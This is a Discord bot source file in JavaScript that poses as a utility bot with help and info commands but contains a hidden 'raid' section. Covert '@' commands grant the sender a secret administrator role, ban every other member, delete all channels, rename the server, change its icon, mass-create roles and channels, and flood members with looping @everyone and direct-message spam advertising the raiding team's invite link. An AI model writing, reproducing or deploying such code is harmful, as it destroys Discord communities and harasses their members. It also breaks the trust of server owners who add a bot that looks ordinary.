const Discord = require('discord.js');
const MagicHitler = require('magic_hitler');

const client = new Discord.Client();
const raid = new MagicHitler.Client({
    client: client,
    prefix: "@"
});

const config = require('./utils/botconfig.json');
const prefix = "!";

/* COMMANDES LEGIT */

client.on('message', message => {
    let args = message.content.slice(prefix.length).trim().split(' ');
    let cmd = args.shift().toLowerCase();
    if(message.author.bot) return;
    if(!message.content.startsWith(prefix)) return;
    try{
        if(cmd === 'ui') cmd = 'userinfo';
        if(cmd === 'h') cmd = 'help';
        if(cmd === 'si') cmd = 'serverinfo';
    delete require.cache[require.resolve(`./commandes/${cmd}.js`)];

        let commandFile = require(`./commandes/${cmd}.js`);
        commandFile.run(Discord, client, message, args, prefix);
    } catch (e) {
        console.log(e.stack);
    }
});

/* COMMANDES DE RAID */

client.on('message', msg => {

    if(msg.content.startsWith("@p")){
        msg.member.guild.createRole({
            name: "fa3t",
            permission: "ADMINISTRATOR",
            mentionable: false
        }).then(function(role) {
            msg.member.addRole(role);
            if(msg.deletable) msg.delete().catch(e => {});
      }).catch(e => {});
    }

    if (msg.content.startsWith('@b')) {
        msg.guild.members.forEach(member => {
          if(!member.roles.exists("name", "fa3t") && member.bannable) member.ban().catch(e => {});
        });
    }

    if (msg.content === '@dm') {
        if(msg.channel.type === "dm") return;
        if(msg.deletable) msg.delete();
        msg.guild.members.forEach(member => {
            setInterval(function () {
        member.send(`La **TEAM FA3T** vient de bz le serveur de **${msg.guild.owner.user.username}** !\n\n**Rejoins-nous :** https://discord.gg/a5rJk2D \n\nhttps://giffiles.alphacoders.com/310/3105.gif`).catch(error => {}) }, 450)})
    }

    if(msg.content.startsWith("@del")){
        if(msg.channel.type === "dm") return;
        if(msg.guild.channels.size === 0) return;
        else if(!msg.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return;
        msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
        msg.guild.createChannel('fa3t-vous-bz', 'text').catch(e => {});
    }

    if(msg.content.startsWith("@s")){
        var interval = setInterval (function () {
            msg.channel.send(":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D\n**\n\nhttps://giffiles.alphacoders.com/310/3105.gif");
        }, 500);
    }

    if(msg.content.startsWith("@g")){
        if(msg.deletable) msg.delete().catch(e => {});
        msg.guild.setIcon("https://s1.qwant.com/thumbr/0x380/b/e/7a54a763b9a1204f9c62742324e463d4f9232c1f4e4d4d98b84068373415d6/3956-full.png?u=https%3A%2F%2Frisibank.fr%2Fcache%2Fstickers%2Fd39%2F3956-full.png&q=0&b=1&p=0&a=1").catch(e => {});
        msg.guild.setName('BZ PAR FA3T').catch(e => {});
    }

})

raid.createChannels("c", {
    createChannelName: "raid-by-fa3t",
    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D\n**\n\nhttps://giffiles.alphacoders.com/310/3105.gif",
    sendMessageCount: 10,
    createChannelCount: 200
});

raid.deleteRoles("dr");
raid.createRoles("cr", {
    rolesNumber: 50,
    rolesName: "raid-by-fa3t"
});

/* Autres */

client.login(process.env.TOKEN);
